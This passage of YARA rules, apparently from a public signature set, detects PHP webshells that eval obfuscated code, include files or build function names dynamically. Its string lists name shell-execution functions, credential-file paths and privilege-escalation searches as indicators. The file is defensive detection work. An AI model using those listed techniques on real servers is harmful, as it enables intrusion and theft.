        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 700KB and not (
            any of ( $gfp* )
        )
        and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and 1 of ( $payload* ) and not any of ( $fp* )
}

rule WEBSHELL_PHP_OBFUSC_3
{
    meta:
        description = "PHP webshell which eval()s obfuscated string"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/04/17"
        modified = "2023-07-05"
        hash = "11bb1fa3478ec16c00da2a1531906c05e9c982ea"
        hash = "d6b851cae249ea6744078393f622ace15f9880bc"
        hash = "14e02b61905cf373ba9234a13958310652a91ece"
        hash = "6f97f607a3db798128288e32de851c6f56e91c1d"

        id = "f2017e6f-0623-53ff-aa26-a479f3a02024"
    strings:
        $obf1 = "chr(" wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_callback
        // the end is 1. ( followed by anything but a direct closing ) 2. /* for the start of an obfuscation comment
        $callback1 = /\bob_start[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback2 = /\barray_diff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback3 = /\barray_diff_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback4 = /\barray_filter[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback5 = /\barray_intersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback6 = /\barray_intersect_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback7 = /\barray_map[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback8 = /\barray_reduce[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback9 = /\barray_udiff_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback10 = /\barray_udiff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback11 = /\barray_udiff[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback12 = /\barray_uintersect_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback13 = /\barray_uintersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback14 = /\barray_uintersect[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback15 = /\barray_walk_recursive[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback16 = /\barray_walk[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback17 = /\bassert_options[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback18 = /\buasort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback19 = /\buksort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback20 = /\busort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback21 = /\bpreg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback22 = /\bspl_autoload_register[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback23 = /\biterator_apply[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback24 = /\bcall_user_func[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback25 = /\bcall_user_func_array[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback26 = /\bregister_shutdown_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback27 = /\bregister_tick_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback28 = /\bset_error_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback29 = /\bset_exception_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback30 = /\bsession_set_save_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback31 = /\bsqlite_create_aggregate[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback32 = /\bsqlite_create_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $callback33 = /\bmb_ereg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii

        $m_callback1 = /\bfilter_var[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $m_callback2 = "FILTER_CALLBACK" fullword wide ascii

        $cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase wide ascii
        $cfp2 = "IWPML_Backend_Action_Loader" ascii wide
        $cfp3 = "<?phpclass WPML" ascii

        //strings from private rule capa_php_payload
        // \([^)] to avoid matching on e.g. eval() in comments
        $cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
        $cpayload10 = /\bpreg_replace[\n\t ]{0,500}(\(.{1,|\/\*)100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
        $cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii

        $m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
        $m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
        // TODO backticks

        //strings from private rule capa_php_obfuscation_single
        $cobfs1 = "gzinflate" fullword nocase wide ascii
        $cobfs2 = "gzuncompress" fullword nocase wide ascii
        $cobfs3 = "gzdecode" fullword nocase wide ascii
        $cobfs4 = "base64_decode" fullword nocase wide ascii
        $cobfs5 = "pack" fullword nocase wide ascii
        $cobfs6 = "undecode" fullword nocase wide ascii

        //strings from private rule capa_gen_sus

        // these strings are just a bit suspicious, so several of them are needed, depending on filesize
        $gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
        $gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
        $gen_bit_sus6  = "self.delete"
        $gen_bit_sus9  = "\"cmd /c" nocase
        $gen_bit_sus10 = "\"cmd\"" nocase
        $gen_bit_sus11 = "\"cmd.exe" nocase
        $gen_bit_sus12 = "%comspec%" wide ascii
        $gen_bit_sus13 = "%COMSPEC%" wide ascii
        //TODO:$gen_bit_sus12 = ".UserName" nocase
        $gen_bit_sus18 = "Hklm.GetValueNames();" nocase
        // bonus string for proxylogon exploiting webshells
        $gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
        $gen_bit_sus21 = "\"upload\"" wide ascii
        $gen_bit_sus22 = "\"Upload\"" wide ascii
        $gen_bit_sus23 = "UPLOAD" fullword wide ascii
        $gen_bit_sus24 = "fileupload" wide ascii
        $gen_bit_sus25 = "file_upload" wide ascii
        // own base64 or base32 func
        $gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
        $gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
        $gen_bit_sus30 = "serv-u" wide ascii
        $gen_bit_sus31 = "Serv-u" wide ascii
        $gen_bit_sus32 = "Army" fullword wide ascii
        // single letter paramweter
        $gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
        $gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
        $gen_bit_sus35 = "crack" fullword wide ascii

        $gen_bit_sus44 = "<pre>" wide ascii
        $gen_bit_sus45 = "<PRE>" wide ascii
        $gen_bit_sus46 = "shell_" wide ascii
        //fp: $gen_bit_sus47 = "Shell" fullword wide ascii
        $gen_bit_sus50 = "bypass" wide ascii
        $gen_bit_sus52 = " ^ $" wide ascii
        $gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
        $gen_bit_sus55 = /\w'\.'\w/ wide ascii
        $gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
        $gen_bit_sus57 = "dumper" wide ascii
        $gen_bit_sus59 = "'cmd'" wide ascii
        $gen_bit_sus60 = "\"execute\"" wide ascii
        $gen_bit_sus61 = "/bin/sh" wide ascii
        $gen_bit_sus62 = "Cyber" wide ascii
        $gen_bit_sus63 = "portscan" fullword wide ascii
        //$gen_bit_sus64 = "\"command\"" fullword wide ascii
        //$gen_bit_sus65 = "'command'" fullword wide ascii
        $gen_bit_sus66 = "whoami" fullword wide ascii
        $gen_bit_sus67 = "$password='" fullword wide ascii
        $gen_bit_sus68 = "$password=\"" fullword wide ascii
        $gen_bit_sus69 = "$cmd" fullword wide ascii
        $gen_bit_sus70 = "\"?>\"." fullword wide ascii
        $gen_bit_sus71 = "Hacking" fullword wide ascii
        $gen_bit_sus72 = "hacking" fullword wide ascii
        $gen_bit_sus73 = ".htpasswd" wide ascii
        $gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii

        // very suspicious strings, one is enough
        $gen_much_sus7  = "Web Shell" nocase
        $gen_much_sus8  = "WebShell" nocase
        $gen_much_sus3  = "hidded shell"
        $gen_much_sus4  = "WScript.Shell.1" nocase
        $gen_much_sus5  = "AspExec"
        $gen_much_sus14 = "\\pcAnywhere\\" nocase
        $gen_much_sus15 = "antivirus" nocase
        $gen_much_sus16 = "McAfee" nocase
        $gen_much_sus17 = "nishang"
        $gen_much_sus18 = "\"unsafe" fullword wide ascii
        $gen_much_sus19 = "'unsafe" fullword wide ascii
        $gen_much_sus24 = "exploit" fullword wide ascii
        $gen_much_sus25 = "Exploit" fullword wide ascii
        $gen_much_sus26 = "TVqQAAMAAA" wide ascii
        $gen_much_sus30 = "Hacker" wide ascii
        $gen_much_sus31 = "HACKED" fullword wide ascii
        $gen_much_sus32 = "hacked" fullword wide ascii
        $gen_much_sus33 = "hacker" wide ascii
        $gen_much_sus34 = "grayhat" nocase wide ascii
        $gen_much_sus35 = "Microsoft FrontPage" wide ascii
        $gen_much_sus36 = "Rootkit" wide ascii
        $gen_much_sus37 = "rootkit" wide ascii
        $gen_much_sus38 = "/*-/*-*/" wide ascii
        $gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
        $gen_much_sus40 = "\"e\"+\"v" wide ascii
        $gen_much_sus41 = "a\"+\"l\"" wide ascii
        $gen_much_sus42 = "\"+\"(\"+\"" wide ascii
        $gen_much_sus43 = "q\"+\"u\"" wide ascii
        $gen_much_sus44 = "\"u\"+\"e" wide ascii
        $gen_much_sus45 = "/*//*/" wide ascii
        $gen_much_sus46 = "(\"/*/\"" wide ascii
        $gen_much_sus47 = "eval(eval(" wide ascii
        // self remove
        $gen_much_sus48 = "unlink(__FILE__)" wide ascii
        $gen_much_sus49 = "Shell.Users" wide ascii
        $gen_much_sus50 = "PasswordType=Regular" wide ascii
        $gen_much_sus51 = "-Expire=0" wide ascii
        $gen_much_sus60 = "_=$$_" wide ascii
        $gen_much_sus61 = "_=$$_" wide ascii
        $gen_much_sus62 = "++;$" wide ascii
        $gen_much_sus63 = "++; $" wide ascii
        $gen_much_sus64 = "_.=$_" wide ascii
        $gen_much_sus70 = "-perm -04000" wide ascii
        $gen_much_sus71 = "-perm -02000" wide ascii
        $gen_much_sus72 = "grep -li password" wide ascii
        $gen_much_sus73 = "-name config.inc.php" wide ascii
        // touch without parameters sets the time to now, not malicious and gives fp
        $gen_much_sus75 = "password crack" wide ascii
        $gen_much_sus76 = "mysqlDll.dll" wide ascii
        $gen_much_sus77 = "net user" wide ascii
        $gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
        $gen_much_sus81 = /strrev\(['"]/ wide ascii
        $gen_much_sus82 = "PHPShell" fullword wide ascii
        $gen_much_sus821= "PHP Shell" fullword wide ascii
        $gen_much_sus83 = "phpshell" fullword wide ascii
        $gen_much_sus84 = "PHPshell" fullword wide ascii
        $gen_much_sus87 = "deface" wide ascii
        $gen_much_sus88 = "Deface" wide ascii
        $gen_much_sus89 = "backdoor" wide ascii
        $gen_much_sus90 = "r00t" fullword wide ascii
        $gen_much_sus91 = "xp_cmdshell" fullword wide ascii
        $gen_much_sus92 = "base64_decode(base64_decode(" fullword wide ascii
        $gen_much_sus93 = "eval(\"/*" wide ascii
        $gen_much_sus94 = "=$_COOKIE;" wide ascii

        $gif = { 47 49 46 38 }


    condition:
        //any of them or
        (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and
        ( (
            not any of ( $cfp* ) and
        (
            any of ( $callback* )  or
            all of ( $m_callback* )
        )
        )
        or (
            any of ( $cpayload* ) or
        all of ( $m_cpayload_preg_filter* )
        )
        ) and (
            any of ( $cobfs* )
        )
        and
        ( filesize < 1KB or
        ( filesize < 3KB and
        ( (
        $gif at 0 or
        (
            filesize < 4KB and
            (
                1 of ( $gen_much_sus* ) or
                2 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 20KB and
            (
                2 of ( $gen_much_sus* ) or
                3 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 50KB and
            (
                2 of ( $gen_much_sus* ) or
                4 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 100KB and
            (
                2 of ( $gen_much_sus* ) or
                6 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 150KB and
            (
                3 of ( $gen_much_sus* ) or
                7 of ( $gen_bit_sus* )
            )
        ) or (
            filesize < 500KB and
            (
                4 of ( $gen_much_sus* ) or
                8 of ( $gen_bit_sus* )
            )
        )
        )
        or #obf1 > 10 ) ) )
}

rule WEBSHELL_PHP_Includer_Eval
{
    meta:
        description = "PHP webshell which eval()s another included file"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/13"
        modified = "2023-04-05"
        hash = "3a07e9188028efa32872ba5b6e5363920a6b2489"
        hash = "ab771bb715710892b9513b1d075b4e2c0931afb6"
        hash = "202dbcdc2896873631e1a0448098c820c82bcc8385a9f7579a0dc9702d76f580"
        hash = "b51a6d208ec3a44a67cce16dcc1e93cdb06fe150acf16222815333ddf52d4db8"

        id = "995fcc34-f91e-5c9c-97b1-84eed1714d40"
    strings:
        $payload1 = "eval" fullword wide ascii
        $payload2 = "assert" fullword wide ascii
        $include1 = "$_FILE" wide ascii
        $include2 = "include" wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 200 and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and 1 of ( $payload* ) and 1 of ( $include* )
}

rule WEBSHELL_PHP_Includer_Tiny
{
    meta:
        description = "Suspicious: Might be PHP webshell includer, check the included file"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/04/17"
        modified = "2023-07-05"
        hash = "0687585025f99596508783b891e26d6989eec2ba"
        hash = "9e856f5cb7cb901b5003e57c528a6298341d04dc"
        hash = "b3b0274cda28292813096a5a7a3f5f77378b8905205bda7bb7e1a679a7845004"

        id = "9bf96ddc-d984-57eb-9803-0b01890711b5"
    strings:
        $php_include1 = /include\(\$_(GET|POST|REQUEST)\[/ nocase wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 100 and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and any of ( $php_include* )
}

rule WEBSHELL_PHP_Dynamic
{
    meta:
        description = "PHP webshell using function name from variable, e.g. $a='ev'.'al'; $a($code)"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/01/13"
        modified = "2023-10-06"
        score = 60
        hash = "65dca1e652d09514e9c9b2e0004629d03ab3c3ef"
        hash = "b8ab38dc75cec26ce3d3a91cb2951d7cdd004838"
        hash = "c4765e81550b476976604d01c20e3dbd415366df"
        hash = "2e11ba2d06ebe0aa818e38e24a8a83eebbaae8877c10b704af01bf2977701e73"

        id = "58ad94bc-93c8-509c-9d3a-c9a26538d60c"
    strings:
        $pd_fp1 = "whoops_add_stack_frame" wide ascii
        $pd_fp2 = "new $ec($code, $mode, $options, $userinfo);" wide ascii
        $pd_fp3 = "($i)] = 600;" ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_dynamic
        // php variable regex from https://www.php.net/manual/en/language.variables.basics.php
        $dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\$/ wide ascii
        $dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\("/ wide ascii
        $dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\('/ wide ascii
        $dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(str/ wide ascii
        $dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\)/ wide ascii
        $dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(@/ wide ascii
        $dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(base64_decode/ wide ascii
        // ${'_'.$_}["_"](${'_'.$_}["__"]
        $dynamic8 = /\${[^}]{1,20}}(\[[^\]]{1,20}\])?\(\${/ wide ascii

        $fp1 = { 3C 3F 70 68 70 0A 0A 24 61 28 24 62 20 3D 20 33 2C 20 24 63 29 3B } /* <?php\x0a\x0a$a($b = 3, $c); */
        $fp2 = { 3C 3F 70 68 70 0A 0A 24 61 28 24 62 20 3D 20 33 2C 20 2E 2E 2E 20 24 63 29 3B } /* <?php\x0a\x0a$a($b = 3, ... $c); */
        $fp3 = { 3C 3F 70 68 70 0A 0A 24 61 20 3D 20 6E 65 77 20 73 74 61 74 69 63 3A 3A 24 62 28 29 3B} /* <?php\x0a\x0a$a = new static::$b(); */
        $fp4 = { 3C 3F 70 68 70 0A 0A 24 61 20 3D 20 6E 65 77 20 73 65 6C 66 3A 3A 24 62 28 29 3B } /* <?php\x0a\x0a$a = new self::$b(); */
        $fp5 = { 3C 3F 70 68 70 0A 0A 24 61 20 3D 20 5C 22 7B 24 76 61 72 43 61 6C 6C 61 62 6C 65 28 29 7D 5C 22 3B } /* <?php\x0a\x0a$a = \"{$varCallable()}\"; */
        $fp6 = "// TODO error about missing expression" /* <?php\x0a// TODO error about missing expression\x0a$a($b = 3, $c,); */
        $fp7 = "// This is an invalid location for an attribute, "
        $fp8 = "/* Auto-generated from php/php-langspec tests */"
    condition:
        filesize > 20 and filesize < 200 and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and (
            any of ( $dynamic* )
        )
        and not any of ( $pd_fp* )
        and not 1 of ($fp*)
}

rule WEBSHELL_PHP_Dynamic_Big
{
    meta:
        description = "PHP webshell using $a($code) for kind of eval with encoded blob to decode, e.g. b374k"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/02/07"
        modified = "2024-02-23"
        score = 50
        hash = "6559bfc4be43a55c6bb2bd867b4c9b929713d3f7f6de8111a3c330f87a9b302c"
        hash = "9e82c9c2fa64e26fd55aa18f74759454d89f968068d46b255bd4f41eb556112e"
        hash = "6def5296f95e191a9c7f64f7d8ac5c529d4a4347ae484775965442162345dc93"
        hash = "dadfdc4041caa37166db80838e572d091bb153815a306c8be0d66c9851b98c10"
        hash = "0a4a292f6e08479c04e5c4fdc3857eee72efa5cd39db52e4a6e405bf039928bd"
        hash = "4326d10059e97809fb1903eb96fd9152cc72c376913771f59fa674a3f110679e"
        hash = "b49d0f942a38a33d2b655b1c32ac44f19ed844c2479bad6e540f69b807dd3022"
        hash = "575edeb905b434a3b35732654eedd3afae81e7d99ca35848c509177aa9bf9eef"
        hash = "ee34d62e136a04e2eaf84b8daa12c9f2233a366af83081a38c3c973ab5e2c40f"

        id = "a5caab93-7b94-59d7-bbca-f9863e81b9e5"
    strings:
        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

        //strings from private rule capa_php_new_long
        // no <?=
        $new_php2 = "<?php" nocase wide ascii
        $new_php3 = "<script language=\"php" nocase wide ascii
        $php_short = "<?"

        //strings from private rule capa_php_dynamic
        // php variable regex from https://www.php.net/manual/en/language.variables.basics.php
        $dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\$/ wide ascii
        $dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\("/ wide ascii
        $dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\('/ wide ascii
        $dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(str/ wide ascii
        $dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\)/ wide ascii
        $dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(@/ wide ascii
        $dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(base64_decode/ wide ascii
        $dynamic8 = "eval(" wide ascii

        //strings from private rule capa_gen_sus

        // these strings are just a bit suspicious, so several of them are needed, depending on filesize
        $gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
        $gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
        $gen_bit_sus6  = "self.delete"
        $gen_bit_sus9  = "\"cmd /c" nocase
        $gen_bit_sus10 = "\"cmd\"" nocase
        $gen_bit_sus11 = "\"cmd.exe" nocase
        $gen_bit_sus12 = "%comspec%" wide ascii
        $gen_bit_sus13 = "%COMSPEC%" wide ascii
        //TODO:$gen_bit_sus12 = ".UserName" nocase
        $gen_bit_sus18 = "Hklm.GetValueNames();" nocase
        // bonus string for proxylogon exploiting webshells
        $gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
        $gen_bit_sus21 = "\"upload\"" wide ascii
        $gen_bit_sus22 = "\"Upload\"" wide ascii
        $gen_bit_sus23 = "UPLOAD" fullword wide ascii
        $gen_bit_sus24 = "fileupload" wide ascii
        $gen_bit_sus25 = "file_upload" wide ascii
        $gen_bit_sus27 = "zuncomp" wide ascii
        $gen_bit_sus28 = "ase6" wide ascii
        // own base64 or base32 func
        $gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
        $gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
        $gen_bit_sus30 = "serv-u" wide ascii
        $gen_bit_sus31 = "Serv-u" wide ascii
        $gen_bit_sus32 = "Army" fullword wide ascii
        // single letter paramweter
        $gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
        $gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
        $gen_bit_sus35 = "crack" fullword wide ascii

        $gen_bit_sus44 = "<pre>" wide ascii
        $gen_bit_sus45 = "<PRE>" wide ascii
        $gen_bit_sus46 = "shell_" wide ascii
        //fp: $gen_bit_sus47 = "Shell" fullword wide ascii
        $gen_bit_sus50 = "bypass" wide ascii
        $gen_bit_sus52 = " ^ $" wide ascii
        $gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
        $gen_bit_sus55 = /\w'\.'\w/ wide ascii
        $gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
        $gen_bit_sus57 = "dumper" wide ascii
        $gen_bit_sus59 = "'cmd'" wide ascii
        $gen_bit_sus60 = "\"execute\"" wide ascii
        $gen_bit_sus61 = "/bin/sh" wide ascii
        $gen_bit_sus62 = "Cyber" wide ascii
        $gen_bit_sus63 = "portscan" fullword wide ascii
        $gen_bit_sus65 = "whoami" fullword wide ascii
        $gen_bit_sus67 = "$password='" fullword wide ascii
        $gen_bit_sus68 = "$password=\"" fullword wide ascii
        $gen_bit_sus69 = "$cmd" fullword wide ascii
        $gen_bit_sus70 = "\"?>\"." fullword wide ascii
        $gen_bit_sus71 = "Hacking" fullword wide ascii
        $gen_bit_sus72 = "hacking" fullword wide ascii
        $gen_bit_sus73 = ".htpasswd" wide ascii
        $gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
        $gen_bit_sus99 = "$password = " wide ascii
        $gen_bit_sus100 = "();$" wide ascii

        // very suspicious strings, one is enough
        $gen_much_sus7  = "Web Shell" nocase
        $gen_much_sus8  = "WebShell" nocase
        $gen_much_sus3  = "hidded shell"
        $gen_much_sus4  = "WScript.Shell.1" nocase
        $gen_much_sus5  = "AspExec"
